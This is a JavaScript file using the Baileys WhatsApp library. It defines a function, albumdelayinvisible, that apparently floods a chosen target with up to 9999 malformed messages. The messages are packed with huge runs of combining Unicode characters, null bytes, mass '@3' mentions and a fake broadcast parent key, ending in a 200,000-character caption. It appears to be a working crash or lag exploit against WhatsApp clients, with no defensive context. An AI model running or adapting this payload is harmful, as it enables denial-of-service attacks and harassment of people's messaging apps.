
const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const crypto = require('crypto');

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));


async function albumdelayinvisible(sock, target, options = {}) {
  if (!sock) throw new Error('albumdelayinvisible: missing sock');
  if (!target) throw new Error('albumdelayinvisible: missing target');

  // allow overriding count & interval via options (kept minimal)
  let requestedCount = Number(options.count ?? 9999);
  if (isNaN(requestedCount) || requestedCount < 1) requestedCount = 1;
  const count = requestedCount; // NOTE: you can cap externally if desired
  const interval = Number(options.interval ?? 100);

  // Build fakeKey (id is a generated string; previously code awaited sock.relayMessage here)
  const fakeKey = {
    remoteJid: "status@broadcast",
    fromMe: true,
    id: `fake-${Date.now()}-${Math.floor(Math.random() * 10000)}`
  };

  let xx = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "yTsEb/zyGK+lB2DApj/PK+gFA1D6Heq/G0DIQ74uh6k=",
    fileLength: "52039",
    height: 786,
    width: 891,
    mediaKey: "XtKW4xJTHhBzWsRkuwvqwQp/7SVayGn6sF6XgNblyLo=",
    fileEncSha256: "rm/kKkIFGA1Vh6yKeaetbsvCS7Cp2vcGYoiNkrvPCwY=",
    directPath: "/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c"
  };

  let xz;
  for (let s = 0; s < count; s++) {
    // set huge caption only on final iteration (keeps intent)
    if (s === count - 1) {
      xx.caption = "𑲱".repeat(200000); // unchanged size if you want it (be careful)
    }

    const xy = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: "MEDIA_ALBUM",
                parentMessageKey: fakeKey,
              },
            },
            imageMessage: xx,
            interactiveMessage: {
              header: {
                hasMediaAttachment: false,
                title: "hello",
              },
              body: { text: "ꦾ࣯࣯".repeat(1000) },
              nativeFlowMessage: {
                buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "ꦾ࣯࣯".repeat(2500),
                      sections: [{
                          title: "\u0000",
                          rows: [{
                              id: "opt_1",
                              title: "ꦾ࣯࣯".repeat(2500),
                              description: "\u0000",
                            },{
                              id: "opt_2",
                              title: "@3".repeat(5000),
                              description: "\u0000",
                            },
                          ],
                        },
                      ],
                    }),
                  },
                ],
                messageParamsJson: "{}",
              },
            },
          },
        },
      }),
      { participant: { jid: target } }
    );

    try {
      xz = await sock.relayMessage(target, xy.message, {
        messageId: xy.key.id,
        participant: { jid: target },
      });
    } catch (err) {
      console.error('relayMessage error', err?.message || err);
      // continue the loop so a final summary can still be sent
    }

    await sleep(interval);
  }

  return { ok: true, lastResult: xz, iterations: count };
}
